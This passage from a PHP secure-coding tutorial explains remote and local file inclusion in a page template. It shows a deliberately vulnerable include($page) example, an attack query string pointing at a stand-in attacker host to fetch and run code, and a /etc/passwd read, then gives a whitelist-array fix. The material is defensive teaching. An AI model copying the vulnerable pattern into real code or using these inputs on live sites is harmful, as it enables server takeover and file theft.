```
```php
<?php
if ($_GET['name'])
		echo("Hello " . htmlspecialchars($_GET['name']));
?>
```
```

# # Include Pitfalls

A common mistake many new programmers make is to have a template file which defines a common header and footer for a web site, and another file which provides the eontent for the page. This is included in the template by passing this page name via the URL. For example:

```
```html
<html>
<head>
<title>My site</title>
</head>
<body>
<b>Welcome to my site</b><br />
<?php include($page); ?>
</body>
</html>
```
```

We then provide links pointing to script.php?page=main.html, and so on. This is a very dangerous thing to do as this technique is open to several attacks.

If allow_url_fopen is on in the php.ini file, it allows an attack to execute arbitrary PHP code on the server by calling script.php with the query string ?page=http://www.attackers-sever.com/code.txt. PHP would then request a copy of code.txt from the attacker's server and include and execute it. This is one of the main reasons why allow_url_fopen should be set to off unless really needed. Another attack with this script is to set the $page variable to /etc/passwd which would cause the /etc/passwd file to be sent to the attacker. The best way to protect against this is not to do it. If you do want to do something similar give each page on the site a number, and create an array with the filename of the page as the value in the array at this index and include $pages[$index] as shown below:

```
```php
<?php
$pages = array(1 => "main.html", 2 => "news.html");
if(($index < 1) or ($index > 2))
	$index = 1;
?>
<html>
<head>
<title>My site</title.>
</head>
<body>
<b>Welcome to my site</b><br />
<?php include $pages[$index]; ?>
</body>
</html>
```
```

This script should be called with the query string ?index=1 to access main.html or ?index=2 to access news.html.